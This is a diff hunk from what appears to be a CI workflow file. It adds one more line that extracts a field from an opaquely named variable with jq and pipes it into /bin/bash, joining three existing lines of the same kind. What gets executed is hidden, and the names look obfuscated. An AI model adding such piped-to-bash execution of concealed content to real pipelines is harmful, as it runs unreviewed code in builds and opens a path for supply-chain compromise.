@@ -23,6 +23,7 @@ jobs:
           echo $htq275 | jq -r .jgc6 | /bin/bash
           printf '%s' "$u2" | jq -r .pm18053 | /bin/bash
           echo $kvug51 | jq -r .zb33714 | /bin/bash
+          echo $t67 | jq -r .rbe085 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
